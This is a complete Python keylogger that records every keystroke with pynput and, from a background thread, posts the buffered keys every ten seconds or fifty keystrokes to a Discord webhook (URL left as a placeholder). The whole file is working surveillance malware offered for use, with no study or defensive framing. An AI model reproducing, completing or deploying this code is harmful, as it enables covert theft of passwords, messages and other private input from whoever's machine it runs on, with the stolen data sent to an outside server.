from pynput import keyboard
import requests
import threading
import time

# Discord Webhook URL
discord_webhook_url = "YOUR_DISCORD_WEBHOOK_URL"

# Buffer to collect keystrokes
keystroke_buffer = []
BUFFER_SIZE = 50  # Send message when 50 keystrokes are collected
TIME_INTERVAL = 10  # Send message every 10 seconds, even if buffer is not full


def send_to_discord():
    """Send the buffered keystrokes to Discord as a whole."""
    last_sent_time = time.time()

    while True:
        try:
            current_time = time.time()
            if len(keystroke_buffer) >= BUFFER_SIZE or (current_time - last_sent_time) >= TIME_INTERVAL:
                # Prepare the message content
                message_content = "".join(keystroke_buffer)

                # # Truncate to Discord's max message size if needed
                # if len(message_content) > 2000:
                #     message_content = message_content[:1997] + "..."

                # Send to Discord
                payload = {"content": f"**Keystrokes Logged:**\n```\n{message_content}\n```"}
                response = requests.post(discord_webhook_url, json=payload)

                if response.status_code == 204:
                    # Clear the buffer after sending
                    keystroke_buffer.clear()
                    last_sent_time = current_time
                else:
                    print(f"Failed to send to Discord: {response.status_code}, {response.text}")

        except Exception as e:
            print(f"Error sending to Discord: {e}")
        time.sleep(1)

def on_press(key):
    """Log each keystroke and add it to the buffer."""
    try:
        keystroke = key.char if hasattr(key, 'char') and key.char is not None else f"[{key}]"
        keystroke_buffer.append(keystroke)
    except Exception as e:
        print(f"Error logging key press: {e}")


def main():
    """Start the keylogger and sending thread."""
    # Start the Discord-sending thread
    threading.Thread(target=send_to_discord, daemon=True).start()

    # Start listening to keystrokes
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    main()